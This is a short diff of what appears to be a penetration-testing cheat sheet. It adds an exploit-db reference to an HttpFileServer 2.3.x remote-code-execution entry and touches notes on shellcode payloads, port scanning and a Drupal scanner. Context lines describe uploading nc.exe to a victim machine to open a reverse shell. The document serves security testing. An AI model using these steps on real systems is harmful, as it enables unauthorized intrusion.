@@ -11,9 +11,10 @@ edit `shellcode` variable with payload and adjusts NOPS to fit it
 </p>
 </details>
 
-<details><summary>HttpFileServer 2.3.x RCE</summary>
+<details><summary>MS14-058 HttpFileServer 2.3.x RCE</summary>
 <p>
 
+(https://www.exploit-db.com/exploits/37064)
 Upload nc.exe into victim machine and performs a reverse shell using nc.exe
 ```python
 	#change these to your webserver for uploading nc.exe
@@ -101,7 +102,7 @@ Scan for port using nicornscan (very fast) and chain it with nmap vuln nse scrip
 
 <details><summary>Droopescan - drupal scanner</summary>
 <p>
-	
+
 (https://github.com/droope/droopescan)
 ```
 git clone https://github.com/droope/droopescan.git
